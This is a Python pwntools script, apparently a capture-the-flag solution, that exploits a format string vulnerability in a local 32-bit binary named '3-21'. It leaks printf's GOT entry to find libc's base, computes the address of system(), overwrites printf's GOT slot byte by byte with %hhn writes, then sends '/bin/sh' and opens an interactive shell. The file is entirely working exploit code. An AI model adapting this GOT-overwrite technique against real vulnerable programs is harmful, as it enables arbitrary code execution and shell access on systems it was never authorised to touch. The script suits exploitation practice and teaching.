from pwn import *
#data
p=process("./3-21")
elf=ELF("/lib/i386-linux-gnu/libc.so.6")
printf_off=elf.symbols['printf']
printf_got=0x804a00c
n=[0,0,0,0]
s=16
offset=6
#data

#func
def b3t4(addr):
	n[0]=addr&0xff
	n[1]=addr&0xff00
	n[1]=n[1]/256;
	n[2]=addr&0xff0000
	n[2]=n[2]/256/256
	n[3]=addr&0xff000000
	n[3]=n[3]/256/256/256
def lv_up(num):
	while(num<0 or num>255):
		if(num>255):
			num=num-256
		else :
			num=num+256
	return num;
def fmt(fmtstr):
	p.sendline(fmtstr)
	re=p.recvrepeat(0.1)
	return re;
#func

#payload making....

#update

payload=p32(printf_got)+"%6$s"
p.sendline(payload)
printf_addr=u32(p.recv()[4:8])
base=printf_addr-printf_off
sys_addr=base+elf.symbols['system']
log.success(hex(sys_addr))
#pause()
b3t4(sys_addr)
#log.success((n[0]))
#log.success((n[1]))
#log.success((n[2]))
#log.success((n[3]))
for i in range(4):
	raw=n[i]
	raw=raw-s
	s=n[i]
	raw=lv_up(raw)
	n[i]=raw;
#log.success((n[0]))
#log.success((n[1]))
#log.success((n[2]))
#log.success((n[3]))
#update end
origin=p32(printf_got)+p32(printf_got+1)+p32(printf_got+2)+p32(printf_got+3)+"%{}c%6$hhn"+"%{}c%7$hhn"+"%{}c%8$hhn"+"%{}c%9$hhn"
payload=origin.format(n[0],n[1],n[2],n[3])
#alog.success((payload))
#payload finish
raw_input("ZZZ");
p.sendline(payload)
p.send("/bin/sh\0")

p.interactive();
